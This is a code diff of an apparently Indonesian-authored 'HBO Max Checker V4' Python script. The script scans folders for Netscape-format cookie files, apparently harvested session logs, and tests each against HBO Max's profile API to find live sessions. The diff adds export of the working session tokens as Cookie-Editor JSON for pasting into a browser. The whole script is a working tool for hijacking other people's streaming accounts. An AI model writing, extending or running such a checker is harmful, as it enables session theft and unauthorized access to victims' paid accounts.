@@ -17,6 +17,31 @@ def signal_handler(sig, frame):
     print("[!] Exiting gracefully.")
     sys.exit(0)
 
+def generate_cookie_json(account):
+    """Generate Cookie-Editor compatible JSON untuk 1 akun HBO."""
+    cookies = account['cookies']
+    result = []
+    
+    # Daftar cookie penting yang wajib dibawa
+    important_cookies = [
+        'st', 'session', 'wbd-profile-context', 
+        'countryCode', 'usr_country', 'usr_state', 
+        'one', 'transientID', 'usprivacy'
+    ]
+    
+    for name in important_cookies:
+        if cookies.get(name):
+            result.append({
+                "domain": ".hbomax.com",
+                "name": name,
+                "path": "/",
+                "secure": True,
+                "httpOnly": True,
+                "sameSite": "Lax",
+                "value": cookies[name]
+            })
+    return result
+
 def save_results():
     global live_accounts, count
     if not live_accounts:
@@ -28,11 +53,17 @@ def save_results():
         f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
         f.write("=" * 80 + "\n\n")
 
-        for i, (email, plan, folder, profiles) in enumerate(live_accounts, 1):
+        for i, (email, plan, folder, profiles, acc) in enumerate(live_accounts, 1):
             f.write(f"[{i:3d}] {email}\n")
             f.write(f"      Plan     : {plan}\n")
             f.write(f"      Folder   : {folder}\n")
             f.write(f"      Profiles : {', '.join(profiles)}\n")
+            f.write("      🍪 Cookie JSON (copy & paste ke Cookie-Editor):\n")
+            
+            cookie_json = generate_cookie_json(acc)
+            if cookie_json:
+                f.write(json.dumps(cookie_json, indent=4, ensure_ascii=False))
+                f.write("\n")
             f.write("-" * 60 + "\n")
 
     print(f"✅ Saved: hbo_live.txt ({count} accounts)")
@@ -48,7 +79,7 @@ print(r"""
 ██║  ██║██████╔╝╚██████╔╝    ██║ ╚═╝ ██║██║  ██║██╔╝ ██╗
 ╚═╝  ╚═╝╚═════╝  ╚═════╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
 
-            HBO Max Checker
+            HBO Max Checker V4
             By     : Kenjisubagja / Klikajar
             Github : kenjisubagja
             FB     : R Panji Subagja
@@ -112,9 +143,6 @@ def parse_netscape_file(filepath, folder_name):
     except Exception:
         return None
 
-    if 'st' not in cookies:
-        return None
-
     return {
         'email': email,
         'plan': metadata.get('PLAN', 'Unknown'),
@@ -124,8 +152,11 @@ def parse_netscape_file(filepath, folder_name):
 
 def check_hbo_account(account_data):
     cookies = account_data['cookies']
-    st_token = cookies['st']
     
+    if 'st' not in cookies:
+        return False, "Missing 'st' cookie"
+
+    st_token = cookies['st']
     url, err = get_api_endpoint(st_token)
     if err:
         return False, err
@@ -151,16 +182,13 @@ def check_hbo_account(account_data):
             data = r.json()
             profiles = []
             
-            # --- PERBAIKAN LOGIKA PARSING JSON ---
             if isinstance(data, dict) and 'data' in data and isinstance(data['data'], list):
-                # Format JSON:API HBO Max (seperti di curl lo)
                 for item in data['data']:
                     if isinstance(item, dict) and 'attributes' in item:
                         p_name = item['attributes'].get('profileName')
                         if p_name:
                             profiles.append(p_name)
             elif isinstance(data, list):
-                # Format fallback jika berupa list biasa
                 for item in data:
                     if isinstance(item, dict):
                         if 'profileName' in item:
@@ -187,9 +215,10 @@ def read_accounts_from_folders():
     for root, dirs, files in os.walk('.'):
         if 'venv' in root or '.git' in root: continue
         current_folder = os.path.basename(root)
+        if current_folder == '.': current_folder = 'Root'
         
         for file in files:
-            if file.endswith('.txt') and file not in ['hbo_live.txt']:
+            if file.endswith('.txt') and file not in ['hbo_live.txt', 'README.txt']:
                 filepath = os.path.join(root, file)
                 acc = parse_netscape_file(filepath, current_folder)
                 if acc: accounts.append(acc)
@@ -199,16 +228,16 @@ def main():
     global live_accounts, count
 
     accounts = read_accounts_from_folders()
-    print(f"✅ Total akun HBO ditemukan: {len(accounts)}")
-
+    
     if not accounts:
-        print("\n[!] Tidak ada file HBO yang valid ditemukan.")
+        print("\n[!] Tidak ada file .txt yang ditemukan di folder ini.")
         return
 
+    print(f"✅ Total file .txt ditemukan: {len(accounts)}")
     print("[INFO] Press CTRL+C at any time to save progress and exit.\n")
 
     for i, acc in enumerate(accounts, 1):
-        display_email = acc['email'][:20] if acc['email'] else "Unknown"
+        display_email = acc['email'][:20] if acc['email'] != 'Unknown' else "No Email Metadata"
         print(f"[{i:3d}/{len(accounts)}] [{acc['folder_name'][:15]}] {display_email:<20}...", end=' ', flush=True)
         
         is_live, profiles = check_hbo_account(acc)
@@ -217,7 +246,7 @@ def main():
             count += 1
             profile_str = ", ".join(profiles)
             print(f"✅ LIVE | Profiles: {profile_str}")
-            live_accounts.append((acc['email'], acc['plan'], acc['folder_name'], profiles))
+            live_accounts.append((acc['email'], acc['plan'], acc['folder_name'], profiles, acc))
         else:
             print(f"❌ dead ({profiles})")
 
